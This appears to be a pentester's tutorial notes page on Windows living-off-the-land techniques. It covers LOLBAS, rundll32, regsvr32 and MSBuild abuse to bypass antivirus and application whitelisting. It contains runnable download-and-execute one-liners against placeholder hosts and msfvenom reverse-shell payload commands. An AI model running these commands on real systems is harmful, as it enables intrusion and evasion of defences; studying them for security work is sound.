##### The basics
Living off the land means using whatever you find there. For Windows, this means microsoft-signed binaries.
These binaries almost never get caught by antiviruses or monitoring softwares.

#### Sysinternals
All the Sysinternals tools should be allowed on a system, and can be downloaded from https://live.sysinternals.com/.
It has some of the most useful tools, like:
```
AccesChk - Check permissions of a file
PsExec - Can execute commands remotely (ex: through AD), and store credentials.
```

#### LOLBAS
The [LOLBAS](https://lolbas-project.github.io/#) project is a library of scripts signed by Microsoft for living off the land, similar to GTFOBins, but for living off the land.


#### Living off the land examples
##### Certutil
```
certutil -encode decoded.txt encoded.txt
certutil -decode encoded.txt decoded.txt
```

##### Rundll32
To execute using `rundll32.exe`:
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://IP/script.ps1');");
// Replace the "powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://IP/script.ps1');"  with a custom payload.
```

#### Bypassing application whitelisting
Application whitelisting is used to heavily secure Windows machines. It's a rule-based whitelist, where any binary on the list is allowed to execute.
The LOLBAS binaries are used internally by the system, so they are nearly never whitelisted.
##### Regsvr32
Regsvr32 is used to register and unregister DLLs. 
```
C:\Windows\System32\regsvr32.exe // 32-bits
C:\Windows\SysWOW64\regsvr32.exe // 64-bits
```
First, create the payload:
```
// MSFConsole:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f dll -a x86 -o shell.dll
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost $IP;set lport $PORT;exploit"
// Non-MSF:
msfvenom -p windows/shell/reverse_tcp LHOST=tun0 LPORT=4444 -f dll -a x86 -o shell.dll
```
Then, run the exploit:
```
c:\Windows\System32\regsvr32.exe c:\Windows\Temp\shell.dll

// NOTE: this command is also possible, but the exact workings are difficult. for more info: https://www.hackingarticles.in/windows-exploitation-regsvr32/
c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct C:\Windows\Temp\shell.dll
```

##### PowerLessShell / MSBuil.exe
When powershell is blocked, you can abuse `MSBuild.exe` using PowerLessShell:
First, find the location of `MSBuild.exe` (It should be in `C:\Windows\Microsoft.NET\Framework\$VERSION\MSBuild.exe`)
```
// If you're using metasploit, follow these:
// Generate a HTTPS payoad
msfvenom -p windows/meterpreter/reverse_winhttps LHOST=$IP LPORT=4444 -f psh-reflection -o https_reflect.ps1
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost $IP;set lport 4444;exploit"
// End of metasploit instructions

python2 PowerLessShell.py -type powershell -source shell.ps1 -output exploit.csproj
// On victim-side:
c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Windows\Temp\exploit.csproj
```

##### Bash.exe
`bash.exe` is used for the WSL (Windows Subsystem for LInux). It's nearly the same as regular bash, but it can also execute `.exe` files.


#### Real life case: Astaroth
- A **WMIC** command is executed to download and run Javascript code.
- Abusing the **BITSadmin** to download multiple binaries from the command and control server. Interestingly, in some cases, the malware uses YouTube channel descriptions to hide their C2 server commands.
- Using the BITSadmin, ADS technique, to hide their binaries within the system for their persistence.
- A **Certutil** tool is used to decode a couple of downloaded payloads into DLL files.
- The DLL files are executed using **Regsvr32**.